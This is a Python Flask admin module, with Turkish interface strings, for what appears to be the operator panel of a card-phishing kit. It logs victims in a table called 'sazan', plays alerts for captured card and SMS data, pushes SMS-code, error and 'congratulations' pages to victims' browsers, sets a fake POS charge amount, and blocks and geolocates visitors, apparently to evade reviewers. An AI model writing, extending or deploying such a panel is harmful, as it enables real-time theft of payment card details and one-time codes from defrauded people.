from __future__ import annotations

from datetime import datetime, timezone
from functools import wraps
from typing import Callable, Optional

import requests
from flask import Blueprint, flash, redirect, render_template, request, session, url_for

from ..config import ADMIN_STATIC_DIR
from ..database import get_cursor
from ..detectors import detect_browser
from ..ip_blocker import ip_blocker
from ..utils import get_client_ip

admin_bp = Blueprint(
    "admin",
    __name__,
    url_prefix="/admin",
    template_folder="../../templates/admin",
    static_folder=str(ADMIN_STATIC_DIR),
    static_url_path="/admin/assets",
)

COMMAND_TABLES = {
    "sms": ("sms", "sms"),
    "tebrik": ("tebrik", "tebrik"),
    "hata1": ("hata1", "hata1"),
    "back": ("back", "back"),
}


def _is_logged_in() -> bool:
    return bool(session.get("admin_authenticated"))


def _login_required(view: Callable):
    @wraps(view)
    def wrapper(*args, **kwargs):
        if not _is_logged_in():
            session["admin_next"] = request.path
            return redirect(url_for("admin.login"))
        return view(*args, **kwargs)

    return wrapper


def _record_panel_status(status: str) -> None:
    ip_address = get_client_ip(request)
    if not ip_address:
        return
    browser = detect_browser(request.headers.get("User-Agent"))
    now = datetime.now().strftime("%d.%m.%Y %H:%M")
    with get_cursor() as cursor:
        cursor.execute("SELECT 1 FROM paneldekiler WHERE ip=? LIMIT 1", (ip_address,))
        if cursor.fetchone():
            cursor.execute(
                "UPDATE paneldekiler SET durum=?, tarayici=?, tarih=? WHERE ip=?",
                (status, browser, now, ip_address),
            )
        else:
            cursor.execute(
                "INSERT INTO paneldekiler (ip, tarih, tarayici, durum) VALUES (?, ?, ?, ?)",
                (ip_address, now, browser, status),
            )


def _remove_panel_entry() -> None:
    ip_address = get_client_ip(request)
    if not ip_address:
        return
    with get_cursor() as cursor:
        cursor.execute("DELETE FROM paneldekiler WHERE ip=?", (ip_address,))


def _fetch_site_settings() -> dict:
    with get_cursor() as cursor:
        cursor.execute("SELECT * FROM site WHERE id=1")
        row = cursor.fetchone()
        return dict(row) if row else {}


def _get_dashboard_stats() -> dict:
    stats = {
        "logs": 0,
        "bans": 0,
        "online": 0,
        "tebrik": 0,
        "browsers": {},
    }
    current_ts = int(datetime.now(tz=timezone.utc).timestamp())
    with get_cursor() as cursor:
        cursor.execute("SELECT COUNT(*) AS total FROM sazan")
        stats["logs"] = cursor.fetchone()["total"]

        cursor.execute("SELECT COUNT(*) AS total FROM ban")
        stats["bans"] = cursor.fetchone()["total"]

        cursor.execute("SELECT COUNT(*) AS total FROM ips WHERE lastOnline > ?", (current_ts,))
        stats["online"] = cursor.fetchone()["total"]

        cursor.execute("SELECT COUNT(*) AS total FROM sazan WHERE now='Tebrik Sayfası'")
        stats["tebrik"] = cursor.fetchone()["total"]

        cursor.execute("SELECT tarayici, COUNT(*) AS total FROM sazan GROUP BY tarayici")
        for row in cursor.fetchall():
            stats["browsers"][row["tarayici"]] = row["total"]
    return stats


def _handle_command(action: str, value: str) -> bool:
    table_info = COMMAND_TABLES.get(action)
    if not table_info or not value:
        return False
    table_name, column = table_info
    with get_cursor() as cursor:
        cursor.execute(f"INSERT INTO {table_name} ({column}) VALUES (?)", (value,))
    return True


def _geolocate_ip(ip_address: str) -> str:
    try:
        response = requests.get(
            "http://www.geoplugin.net/json.gp",
            params={"ip": ip_address},
            timeout=3,
        )
        data = response.json()
    except Exception:
        return ""
    city = (data or {}).get("geoplugin_city") or ""
    country = (data or {}).get("geoplugin_countryName") or ""
    location = city.strip()
    if country:
        location = f"{location} [{country}]" if location else f"[{country}]"
    return location


def _ban_visitor(target_ip: str, log_id: Optional[int]) -> None:
    cihaz = "Bilinmiyor"
    tarayici = "Bilinmiyor"
    with get_cursor() as cursor:
        if log_id is not None:
            cursor.execute("SELECT cihaz, tarayici FROM sazan WHERE id=? LIMIT 1", (log_id,))
            record = cursor.fetchone()
        else:
            cursor.execute("SELECT cihaz, tarayici FROM sazan WHERE ip=? ORDER BY id DESC LIMIT 1", (target_ip,))
            record = cursor.fetchone()
        if record:
            record_dict = dict(record)
            cihaz = record_dict.get("cihaz") or cihaz
            tarayici = record_dict.get("tarayici") or tarayici
    location = _geolocate_ip(target_ip)
    tarih = datetime.now().strftime("%d.%m.%Y %H:%M")
    with get_cursor() as cursor:
        cursor.execute(
            "INSERT INTO ban (ban, ulke, cihaz, tarayici, date) VALUES (?, ?, ?, ?, ?)",
            (target_ip, location, cihaz, tarayici, tarih),
        )
        cursor.execute("DELETE FROM sazan WHERE ip=?", (target_ip,))


def _handle_log_action(action: str, ip_value: str, log_id: Optional[int]) -> None:
    action = (action or "").lower()
    if action in COMMAND_TABLES:
        if _handle_command(action, ip_value):
            flash("Komut ilgili cihaza gönderildi.", "success")
        else:
            flash("Komut gönderilirken bir sorun oluştu.", "danger")
        return
    if action == "delete" and log_id is not None:
        with get_cursor() as cursor:
            cursor.execute("DELETE FROM sazan WHERE id=?", (log_id,))
        flash("Log kaydı silindi.", "info")
        return
    if action == "ban" and ip_value:
        _ban_visitor(ip_value, log_id)
        flash("IP adresi yasaklandı.", "warning")
        return
    flash("Bilinmeyen işlem isteği.", "danger")


@admin_bp.route("/login", methods=["GET", "POST"])
def login():
    if _is_logged_in():
        return redirect(url_for("admin.dashboard"))
    error = None
    if request.method == "POST":
        password = (request.form.get("password") or "").strip()
        site_settings = _fetch_site_settings()
        if password and password == site_settings.get("pass"):
            session["admin_authenticated"] = True
            _record_panel_status("Anasayfa")
            next_url = session.pop("admin_next", None)
            return redirect(next_url or url_for("admin.dashboard"))
        error = "Şifre hatalı. Lütfen tekrar deneyin."
    return render_template("admin/login.html", error=error)


@admin_bp.route("/logout")
def logout():
    session.pop("admin_authenticated", None)
    _remove_panel_entry()
    return redirect(url_for("admin.login"))


@admin_bp.route("/")
@_login_required
def dashboard():
    _record_panel_status("Anasayfa")
    stats = _get_dashboard_stats()
    panel_users = []
    with get_cursor() as cursor:
        cursor.execute("SELECT * FROM paneldekiler ORDER BY ip DESC")
        panel_users = [dict(row) for row in cursor.fetchall()]
    return render_template("admin/dashboard.html", stats=stats, panel_users=panel_users)


@admin_bp.route("/logs", methods=["GET", "POST"])
@_login_required
def logs():
    _record_panel_status("Log Tablosu")
    if request.method == "POST":
        action = request.form.get("action")
        target_ip = request.form.get("target_ip")
        log_id = request.form.get("log_id")
        log_id_int = int(log_id) if log_id and log_id.isdigit() else None
        _handle_log_action(action, target_ip or "", log_id_int)
        return redirect(url_for("admin.logs"))
    logs_data = []
    with get_cursor() as cursor:
        cursor.execute("SELECT * FROM sazan ORDER BY id DESC")
        logs_data = [dict(row) for row in cursor.fetchall()]
    site_settings = _fetch_site_settings()
    play_card_sound = bool(site_settings.get("kart_sesi"))
    play_sms_sound = bool(site_settings.get("sms_sesi"))
    if play_card_sound or play_sms_sound:
        with get_cursor() as cursor:
            cursor.execute("UPDATE site SET kart_sesi=0, sms_sesi=0 WHERE id=1")
    current_ts = int(datetime.now(tz=timezone.utc).timestamp())
    return render_template(
        "admin/logs.html",
        logs=logs_data,
        card_sound=play_card_sound,
        sms_sound=play_sms_sound,
        current_ts=current_ts,
    )


@admin_bp.route("/bans", methods=["GET", "POST"])
@_login_required
def bans():
    _record_panel_status("Ban Tablosu")
    if request.method == "POST":
        ban_ip = request.form.get("ban_ip")
        with get_cursor() as cursor:
            cursor.execute("DELETE FROM ban WHERE ban=?", (ban_ip,))
        flash("IP yasağı kaldırıldı.", "info")
        return redirect(url_for("admin.bans"))
    with get_cursor() as cursor:
        cursor.execute("SELECT * FROM ban ORDER BY date DESC")
        ban_list = [dict(row) for row in cursor.fetchall()]
    return render_template("admin/bans.html", bans=ban_list)


@admin_bp.route("/reklam-taramasi")
@_login_required
def reklam_taramasi():
    _record_panel_status("Reklam Taraması")
    return render_template("admin/reklam-taramasi.html")


@admin_bp.route("/settings", methods=["GET", "POST"])
@_login_required
def settings():
    _record_panel_status("Panel Ayarları")
    site_settings = _fetch_site_settings()
    if request.method == "POST":
        form_type = request.form.get("form")
        if form_type == "password":
            new_password = (request.form.get("password") or "").strip()
            if new_password:
                with get_cursor() as cursor:
                    cursor.execute("UPDATE site SET pass=? WHERE id=1", (new_password,))
                flash("Panel şifresi güncellendi.", "success")
                site_settings["pass"] = new_password
        elif form_type == "tutar":
            new_tutar = (request.form.get("tutar") or "").strip()
            if new_tutar:
                with get_cursor() as cursor:
                    cursor.execute("UPDATE site SET tutar=? WHERE id=1", (new_tutar,))
                flash("POS tutarı güncellendi.", "success")
                site_settings["tutar"] = new_tutar
        else:
            flash("Tanımsız ayar isteği.", "warning")
        return redirect(url_for("admin.settings"))
    return render_template("admin/settings.html", site=site_settings)


@admin_bp.route("/ip-blocker", methods=["GET", "POST"])
@_login_required
def ip_blocker_panel():
    _record_panel_status("IP Engelleme")
    
    if request.method == "POST":
        action = request.form.get("action")
        
        if action == "add_ip":
            ip_address = (request.form.get("ip_address") or "").strip()
            if ip_address:
                ip_blocker.add_ip(ip_address)
                flash(f"IP adresi engellendi: {ip_address}", "success")
            else:
                flash("Geçerli bir IP adresi girin.", "danger")
        
        elif action == "add_range":
            cidr = (request.form.get("cidr") or "").strip()
            if cidr:
                ip_blocker.add_range(cidr)
                flash(f"IP aralığı engellendi: {cidr}", "success")
            else:
                flash("Geçerli bir CIDR aralığı girin (örn: 192.168.1.0/24).", "danger")
        
        elif action == "remove_ip":
            ip_address = (request.form.get("ip_address") or "").strip()
            if ip_address:
                ip_blocker.remove_ip(ip_address)
                flash(f"IP engeli kaldırıldı: {ip_address}", "info")
            else:
                flash("Geçerli bir IP adresi girin.", "danger")
        
        return redirect(url_for("admin.ip_blocker_panel"))
    
    # Engelli IP'leri ve aralıkları listele
    blocked_ips = [str(ip) for ip in ip_blocker.blocked_ips]
    blocked_ranges = [str(net) for net in ip_blocker.blocked_ranges]
    
    return render_template(
        "admin/ip-blocker.html",
        blocked_ips=blocked_ips,
        blocked_ranges=blocked_ranges
    )